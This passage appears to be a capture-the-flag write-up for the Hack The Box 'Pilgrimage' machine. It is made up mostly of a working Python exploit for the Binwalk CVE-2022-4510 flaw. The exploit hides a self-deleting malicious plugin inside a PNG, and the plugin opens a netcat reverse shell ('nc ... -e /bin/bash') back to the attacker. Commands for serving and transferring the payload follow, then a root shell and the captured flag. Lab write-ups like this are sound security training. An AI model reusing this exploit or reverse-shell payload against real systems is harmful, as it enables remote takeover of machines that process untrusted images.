print("---------Q. Kaiser, ONEKEY Research Lab---------")
print("---------Exploit tested on debian 11------------")
print("################################################")
print("")

parser = argparse.ArgumentParser()
parser.add_argument("file", help="Path to input .png file",default=1)
parser.add_argument("ip", help="Ip to nc listener",default=1)
parser.add_argument("port", help="Port to nc listener",default=1)

args = parser.parse_args()
            
if args.file and args.ip and args.port:
    header_pfs = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
    lines = ['import binwalk.core.plugin\n','import os\n', 'import shutil\n','class MaliciousExtractor(binwalk.core.plugin.Plugin):\n','    def init(self):\n','        if not os.path.exists("/tmp/.binwalk"):\n','            os.system("nc ',str(args.ip)+' ',str(args.port)+' ','-e /bin/bash 2>/dev/null &")\n','            with open("/tmp/.binwalk", "w") as f:\n','                f.write("1")\n','        else:\n','            os.remove("/tmp/.binwalk")\n', '            os.remove(os.path.abspath(__file__))\n','            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))\n']

    in_file = open(args.file, "rb")
    data = in_file.read()
    in_file.close()
    
    with open("/tmp/plugin", "w") as f:
       for line in lines:
          f.write(line)

    with open("/tmp/plugin", "rb") as f: 
        content = f.read()

    os.system("rm /tmp/plugin")

    with open("binwalk_exploit.png", "wb") as f:
        f.write(data)
        f.write(header_pfs)
        f.write(content)

    print("")    
    print("You can now rename and share binwalk_exploit and start your local netcat listener.")
    print("")
```

I see the `options`:
```sh
┌──(kali㉿kali)-[~]
└─$ python3 priv.py -h                                         

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################

usage: priv.py [-h] file ip port

positional arguments:
  file        Path to input .png file
  ip          Ip to nc listener
  port        Port to nc listener

options:
  -h, --help  show this help message and exit
```

I `generate` the `payload`:
```sh
┌──(kali㉿kali)-[~]
└─$ python3 priv.py lupin.png 10.10.14.101 1234      

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```

I open a Web Server in the Local Machine:
```sh
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 4444 
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

I open a listening port in the Local Machine:
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
```

Transfer the payload in the Target Machine, and I copy the payload in this directory `/var/www/pilgrimage.htb/shrunk`:
```sh
emily@pilgrimage:~$ curl http://10.10.14.101:4444/binwalk_exploit.png -O binwalk_exploit.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  130k  100  130k    0     0   214k      0 --:--:-- --:--:-- --:--:--  214k
^C
emily@pilgrimage:~$ ls
binwalk_exploit.png  user.txt
emily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
emily@pilgrimage:~$ ls -all /var/www/pilgrimage.htb/shrunk/
total 140
drwxrwxrwx 2 root  root    4096 Sep  7 03:00 .
drwxr-xr-x 7 root  root    4096 Jun  8 00:10 ..
-rw-r--r-- 1 emily emily 133490 Sep  7 03:00 binwalk_exploit.png
```

I get the `root flag`:
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.101] from (UNKNOWN) [10.10.11.219] 35206
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@pilgrimage:~/quarantine# whoami
whoami
root
root@pilgrimage:~/quarantine# cat /root/root.txt
cat /root/root.txt
904453b7a7bf4e9f63ae8b81175e7a5f
```